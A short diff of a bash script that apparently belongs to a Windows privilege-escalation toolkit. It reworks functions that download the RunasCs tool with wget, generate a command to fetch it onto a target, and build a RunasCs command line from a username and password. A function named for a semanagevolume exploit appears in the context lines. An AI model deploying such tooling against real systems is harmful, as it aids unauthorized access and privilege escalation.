@@ -407,7 +407,7 @@ download_runas() {
         mkdir runascs
     fi
     pushd runascs || return 1 
-    echo "Downloading RunasCs tool."
+    echo "Downloading RunasCs tool." >> $trail_log
     if [[ ! -f "RunasCs.exe" ]]; then
         wget "$url" -O runascs.zip >> $trail_log
         unzip runascs.zip >> $trail_log
@@ -421,7 +421,7 @@ download_runas() {
         return 1
     fi
     popd || return 1 >/dev/null
-    generate_windows_download "runascs/RunasCs.exe" "RunasCs.exe"
+    cmd=$(generate_windows_download "runascs/RunasCs.exe" "RunasCs.exe")
 }
 
 perform_runas() {
@@ -436,8 +436,7 @@ perform_runas() {
     else
         domain_option="-d $domain"
     fi    
-    echo ".\RunasCs.exe $domain_option $username $password \"$cmd\" $runas_additional_options;"
-
+    cmd=".\RunasCs.exe $domain_option $username $password \"$cmd\" $runas_additional_options;"
 }
 
 perform_semanagevolume_exploit() {
